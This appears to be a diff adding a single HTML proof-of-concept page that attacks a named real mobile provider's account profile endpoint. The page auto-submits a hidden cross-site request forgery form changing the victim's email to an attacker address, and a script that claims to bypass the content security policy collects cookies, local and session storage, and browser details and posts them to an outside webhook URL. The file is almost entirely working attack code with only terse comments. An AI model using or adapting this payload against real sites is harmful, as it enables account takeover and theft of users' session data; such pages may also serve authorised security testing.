@@ -1,0 +1,34 @@
+<html>
+  <body>
+    <!-- CSRF Form to change victim's email -->
+    <form action="https://mobilevikings.be/en/my-viking/account/profile?spc=password" 
+          method="POST" id="csrfForm" enctype="application/x-www-form-urlencoded">
+      <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+
+    <!-- CSP bypass since nonce="" -->
+    <script async nonce="">
+      // Prepare data for exfiltration
+      const params = new URLSearchParams();
+      params.append('cookie', document.cookie);
+      params.append('localStorage', JSON.stringify(localStorage));
+      params.append('sessionStorage', JSON.stringify(sessionStorage));
+      params.append('userAgent', navigator.userAgent);
+      params.append('platform', navigator.platform);
+      params.append('language', navigator.language);
+      params.append('referrer', document.referrer);
+
+      // Send the data to your webhook
+      fetch('https://webhook.site/3a241cb6-a785-4950-93d7-6e494b62f73d', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: params
+      });
+
+      // Auto fire the CSRF request
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
